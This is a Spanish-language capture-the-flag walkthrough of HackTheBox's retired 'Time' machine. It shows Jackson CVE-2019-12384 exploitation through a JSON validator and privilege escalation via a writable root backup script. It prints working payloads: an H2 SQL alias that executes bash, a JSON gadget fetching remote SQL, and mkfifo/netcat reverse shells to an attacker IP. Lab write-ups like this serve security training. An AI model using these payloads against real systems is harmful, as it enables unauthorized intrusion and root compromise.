 # Máquina "Time" de HackTheBox

**Características:**
- Linux
- Dificultad: Media 
- Explotación de Jackson CVE-2019-12384
- SSRF to RCE abusando de Cron Job [Privilege Escalation]

**Útil para certificaciones:** eWPT, OSWE, OSCP

La máquina "Time" fue retirada de HackTheBox.

**IP:** 10.10.10.214

## Escaneo de puertos

Comando utilizado:
```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.214
```

![Escaneo de puertos](/secciones/posts/imagenes/time/time.png "Escaneo de puertos"){width=500}

Al realizar un escaneo de puertos completo con Nmap, se observan dos puertos abiertos:
- Puerto SSH (22)
- Puerto Web (80)

Se detecta OpenSSH en el puerto 22 y un servidor web Apache2 en el puerto 80.

## Enumeración web

Al acceder a la página web, nos encontramos con un beautifier y validador de JSON en línea.

![Interfaz web](/secciones/posts/imagenes/time/time1.png "Interfaz web"){width=500}

La opción "Beautify" mejora el código JSON, pero no ofrece mucha superficie de ataque. Al revisar la opción "Validate" (en versión Beta), al ingresar código JSON se muestra un error que revela la biblioteca utilizada: `com.fasterxml.jackson.databind`.

![Error de validación](/secciones/posts/imagenes/time/time2.png "Error de validación"){width=500}

Investigando en Google, descubrimos que esta funcionalidad es vulnerable (CVE-2019-12384):
https://github.com/jas502n/CVE-2019-12384

## Explotación de la vulnerabilidad

Decidimos utilizar el exploit para obtener una shell reversa. Creamos el siguiente payload:

```java
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
}$$;
CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 9001 >/tmp/f')
```

**Nota:** Debe reemplazar la dirección IP en la función `SHELLEXEC()`.

Pasos para la explotación:
1. Lanzar Python HTTP Server: `sudo python3 -m http.server 80`
2. Iniciar Netcat en el puerto 9001: `nc -nvlp 9001`
3. Ingresar el siguiente código en el campo de entrada del sitio web (opción Validate):

```json
["ch.qos.logback.core.db.DriverManagerConnectionSource",{"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.10:80/inyectar.sql'"}]
```

![Explotación](/secciones/posts/imagenes/time/time3.png "Explotación"){width=500}

También puede usarse en forma sin formato para obtener la shell inversa.

## Conexión establecida

Una vez obtenido el acceso, verificamos los privilegios:

```bash
whoami && id
```

![Shell obtenida](/secciones/posts/imagenes/time/time4.png "Shell obtenida"){width=500}
![Verificación de usuario](/secciones/posts/imagenes/time/time5.png "Verificación de usuario"){width=500}

Configuración de la consola:
```bash
script /dev/null -c bash
# Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
uname -a
```

Buscamos la flag de usuario:
```bash
cat /home/pericles/user.txt
```

![Flag de usuario](/secciones/posts/imagenes/time/time6.png "Flag de usuario"){width=500}

## Escalada de privilegios

Ejecutamos `linpeas.sh` (script de enumeración post-explotación) que nos revela vectores potenciales. Linpeas encontró un script `timer_backup.sh` en `/usr/bin/` modificable por usuarios normales, creado por root y que mueve copias de seguridad a su carpeta.

![Linpeas output](/secciones/posts/imagenes/time/time8.png "Linpeas output"){width=500}

Al analizar el script, confirmamos que comprime y mueve archivos a la carpeta root. Verificamos los permisos:

```bash
ls -la /usr/bin/timer_backup.sh
```

![Permisos del script](/secciones/posts/imagenes/time/time11.png "Permisos del script"){width=500}

Al intentar ejecutarlo obtenemos "Permission denied", lo que indica que solo puede ser ejecutado por root. Esto significa que todo su contenido se ejecuta con privilegios root, por lo que si insertamos un payload de shell inverso, se ejecutará con esos privilegios. Esta explotación entra en la categoría de "Exploitation of Unwanted File Permission".

### Obteniendo shell root

**Atacante:**
```bash
nc -nvlp 4321
```

**Víctima:**
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.10 4321 >/tmp/f' >> /usr/bin/timer_backup.sh
 

**Nota:** Algunos writeups pueden tener contenido de otras páginas o pocas imágenes debido a que en algunas máquinas no tomé apuntes completos. He recopilado información de varios writeups para crear esta guía. Si encuentras errores ortográficos o técnicos, puedes contactarme por correo.
 